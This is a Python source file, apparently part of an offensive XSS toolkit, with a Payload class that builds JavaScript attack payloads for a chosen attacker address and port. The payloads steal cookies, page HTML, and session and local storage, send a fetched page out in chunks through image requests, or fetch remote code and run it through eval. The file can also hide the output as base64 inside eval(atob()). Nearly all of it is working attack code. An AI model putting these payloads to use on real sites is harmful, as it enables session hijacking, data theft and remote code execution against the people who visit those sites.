from base64 import b64encode
from jsmin import jsmin

class Payload:
  def __init__(self):
    self._name = ''
    self.from_file = ''
    self.from_string = ''

    self.addr = ''
    self.port = ''

    self.filename = ''
    self.exfil_uri = ''

    self.minimize = True
    self.base64 = False
  
  @property
  def name(self):
    return self._name

  @name.setter
  def name(self,value):
    if value in [ 'default', 'smol', 'exfil', 'stager' ]:
      self._name = value
    else:
      raise ValueError(f"{value} is not a supported payload")

  def generate(self):
    p = ""
    match self.name:
      case "default":
        p = self.default()
      case "smol":
        p = self.smol()
      case "exfil":
        p = self.exfil()
      case "stager":
        p = self.stager()
    p = self.process(p)
    return p

  def generate_from_string(self):
    p = self.from_string
    p = self.process(p)
    return(p)

  def generate_from_file(self):
    p = self.load_file(self.from_file)
    p = self.process(p)
    return(p)

  def process(self,p):
    p = p.strip()
    if self.minimize:
      p = jsmin(p)
    if self.base64:
      b64 = b64encode(p.encode('utf-8')).decode('utf-8')
      p = f"eval(atob(\"{b64}\"))"
    return p

  def load_file(self,file):
    with open(file,"r") as data:
        payload = data.read()
    return payload

  def default(self):
    if not self.addr:
      raise AttributeError("addr is required for this payload")
    if not self.port:
      raise AttributeError("port is required for this payload")
    return f''' 
    // https://stackoverflow.com/questions/30106476/using-javascripts-atob-to-decode-base64-doesnt-properly-decode-utf-8-strings
    function b64EncodeUnicode(str) {{
        // first we use encodeURIComponent to get percent-encoded Unicode,
        // then we convert the percent encodings into raw bytes which
        // can be fed into btoa.
        return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{{2}})/g,
            function toSolidBytes(match, p1) {{
                return String.fromCharCode('0x' + p1);
        }}));
    }}
    const s = "\\n---\\n";
    payload = s;
    const props = [ "document.cookie", "document.location", "top.location", "document.referer", "document.head.outerHTML", "document.body.outerHTML" ];
    for (const p of props) {{
      payload += p + s + eval(p) + s;
    }}
    const objs = [ "window.sessionStorage", "window.localStorage", "document.scripts" ]
    for (const o of objs) {{
      tmpobj = eval(o);
      if(Object.keys(tmpobj).length) {{
        payload += o + s;
        for (const [key, value] of Object.entries(tmpobj) ) {{
          payload += key.toString() + ": " 
          if (typeof value == 'object') {{
            payload += value.outerHTML;
          }} else {{
            payload += value;
          }}
          payload += s;
        }}
      }}
    }}
    let xhr = new XMLHttpRequest();
    xhr.open("POST","http://{self.addr}:{self.port}/");
    xhr.send(b64EncodeUnicode(payload));
    '''

  def smol(self):
    if not self.addr:
      raise AttributeError("addr is required for this payload")
    if not self.port:
      raise AttributeError("port is required for this payload")

    return f'''
    fetch("http://{self.addr}:{self.port}/"+document.cookie)
    '''

  def stager(self):
    if not self.addr:
      raise AttributeError("addr is required for this payload")
    if not self.port:
      raise AttributeError("port is required for this payload")
    if not self.filename:
      raise AttributeError("filename is required for this payload")
  
    url = f"http://{self.addr}:{self.port}/{self.filename}"
    return f'''
    fetch('{url}')
      .then(response => {{
        return response.text(); 
      }})
      .then(data => {{
        eval(data);
      }})
    '''

  def exfil(self):
    if not self.addr:
      raise AttributeError("addr is required for this payload")
    if not self.port:
      raise AttributeError("port is required for this payload")
    if not self.exfil_uri:
      raise AttributeError("exfil URI is required for this payload")

    # lifted from
    # https://github.com/hoodoer/XSS-Data-Exfil
    # https://stackoverflow.com/questions/30106476/using-javascripts-atob-to-decode-base64-doesnt-properly-decode-utf-8-strings
    return f'''
    // TrustedSec Proof-of-Concept to steal 
    // sensitive data through XSS payload

    function read_body(xhr) 
    {{ 
      var data;

      if (!xhr.responseType || xhr.responseType === "text") 
      {{
        data = xhr.responseText;
      }} 
      else if (xhr.responseType === "document") 
      {{
        data = xhr.responseXML;
      }} 
      else if (xhr.responseType === "json") 
      {{
        data = xhr.responseJSON;
      }} 
      else 
      {{
        data = xhr.response;
      }}
      return data; 
    }}

    // https://stackoverflow.com/questions/30106476/using-javascripts-atob-to-decode-base64-doesnt-properly-decode-utf-8-strings
    function b64EncodeUnicode(str) {{
        // first we use encodeURIComponent to get percent-encoded Unicode,
        // then we convert the percent encodings into raw bytes which
        // can be fed into btoa.
        return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{{2}})/g,
            function toSolidBytes(match, p1) {{
                return String.fromCharCode('0x' + p1);
        }}));
    }}

    function stealData()
    {{
      var uri = "{self.exfil_uri}"
      var exfil = "http://{self.addr}:{self.port}";

      xhr = new XMLHttpRequest();
      xhr.open("GET", uri, true);
      xhr.send(null);

      xhr.onreadystatechange = function()
      {{
        if (xhr.readyState == XMLHttpRequest.DONE)
        {{
          // We have the response back with the data
          var dataResponse = read_body(xhr);


          // Time to exfiltrate the HTML response with the data
          var exfilChunkSize = 2000;
          //var exfilData      = btoa(dataResponse);
          var exfilData      = b64EncodeUnicode(dataResponse);
          var numFullChunks  = ((exfilData.length / exfilChunkSize) | 0);
          var remainderBits  = exfilData.length % exfilChunkSize;

          // Exfil the yummies
          for (i = 0; i < numFullChunks; i++)
          {{
            console.log("Loop is: " + i);

            var exfilChunk = exfilData.slice(exfilChunkSize *i, exfilChunkSize * (i+1));

            // Let's use an external image load to get our data out
            // The file name we request will be the data we're exfiltrating
            var downloadImage = new Image();
            downloadImage.onload = function()
            {{
              image.src = this.src;
            }};

            // Try to async load the image, whose name is the string of data
            downloadImage.src = exfil + "/exfil/" + i + "/" + exfilChunk + ".jpg";
          }}

          // Now grab that last bit
          var exfilChunk = exfilData.slice(exfilChunkSize * numFullChunks, (exfilChunkSize * numFullChunks) + remainderBits);
          var downloadImage = new Image();
          downloadImage.onload = function()
          {{
              image.src = this.src;   
          }};
         
          // sleeping in case they come out of order - once the listener gets LAST it reassembles 
          setTimeout(() => {{
            downloadImage.src = exfil + "/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
          }}, 2000);
          console.log("Done exfiling chunks..");
        }}
      }}
    }}

    stealData();
    '''
